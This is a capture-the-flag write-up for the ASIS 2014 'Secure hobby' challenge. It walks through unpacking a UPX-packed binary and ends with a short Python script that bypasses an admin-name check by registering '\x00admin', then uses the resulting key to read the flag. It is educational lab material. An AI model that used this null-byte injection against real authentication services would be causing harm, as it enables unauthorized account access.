# ASIS Cyber Security Contest Finals 2014: Secure hobby

**Category:** Pwn
**Points:** 250
**Description:**

> [File](hobby_8524ad2ae5fde9a43d7e6b1956c8099b) is running here:
>
> ```bash
> nc asis-ctf.ir 12439
> ```

## Write-up

Let’s see what [the provided file](hobby_8524ad2ae5fde9a43d7e6b1956c8099b) could be:

```bash
$ file hobby_8524ad2ae5fde9a43d7e6b1956c8099b
hobby_8524ad2ae5fde9a43d7e6b1956c8099b: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < hobby_8524ad2ae5fde9a43d7e6b1956c8099b > hobby`
* `unxz < hobby_8524ad2ae5fde9a43d7e6b1956c8099b > hobby`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x hobby_8524ad2ae5fde9a43d7e6b1956c8099b
```

Let’s find out what the extracted file is:

```bash
$ file hobby
hobby: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
```

## The Challenge

Let's connect to the service to see what we're dealing with

```bash
$ nc asis-ctf.ir 12439
-------------------------------------------------
| 	Welcome to Super Secure Auth Engine	|
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
1
Enter username: admin
Kidding Me? :(
```

So we cannot register the username `admin`. Registering other usernames does work, in which case we are given a key.

```bash
Enter username: hacknamstyle
Your key for login is: 6147466a6132356862584e306557786c95a6d58cd2be3f87ff4a27e51afaff87
```

This key can then be given as input to option two or three:

```bash
2
Enter key: 6147466a6132356862584e306557786c95a6d58cd2be3f87ff4a27e51afaff87
OK
User hacknamstyle authenticated

[..]

3
Enter key: 6147466a6132356862584e306557786c95a6d58cd2be3f87ff4a27e51afaff87
You don't have any secret! :(
```

From the output of option two we notice that the key somehow encodes the username (and probably some secret authentication code). It's likely that the secret associated with the `admin` username contains the flag. Let's load the binary in IDA to see whether we can calculate the key for `admin` ourselves. We notice that the code appears obfuscated and/or that the executable is packed (IDA detected few functions and the executable is not importing many API functions). Running `strings` on the executable reveals that it's packed with UPX.

```bash
$ strings hobby | grep -i upx
UPX!
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $
UPX!u
UPX!
UPX!
```

We can easily unpack this using [public UPX tools](http://upx.sourceforge.net/). Now we get a normal looking executable in IDA.

After some reversing, we have that the program reads the file `namak` on start-up, and saves the content to a global variable. When calculating the key for a user, this secret data appears to be used. Hence, since we don't know the content of the file, it appears we cannot calculate a valid key ourselves. However, while reversing the key generation algorithm, we notice that `strstr` is being used to check whether the username contains the string `admin`. Is it possible to bypass this check by including a leading NULL byte in the username? The answer is yes! Hence we get the key of the admin by using the username `\x00admin`. This key can then be used to read the secret of the admin (which is of course the flag):

```python
from netcatlib import *

# Get the key for admin
nc = Netcat('asis-ctf.ir', 12439)
nc.write("1\n")
nc.read_until("Enter username: ")
nc.write("\x00admin")
nc.read_until("Your key for login is: ")
key = nc.read_until("\n")
print "[+] Key for admin is", key,

# Get the secret of admin
nc = Netcat('asis-ctf.ir', 12439)
nc.write("3\n")
nc.read_until("Enter key: ")
nc.write(key)
nc.read_until("The flag is: ")
print "[+] Secret of admin:", nc.read_all()
```

The output of the script is:

```python
[+] Key for admin is 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
[+] Secret of admin: ASIS_65cc76f02093977bfd7629086e813666
```

## Other write-ups and resources

* <http://barrebas.github.io/blog/2014/10/31/asis-ctf-secure-hobby/>
* [Alternative Exploit in Python](http://pastebin.com/b2QVFK2U)
* [French](https://t0x0sh.org/asis-ctf-finals-hobby-pownable-250.html)
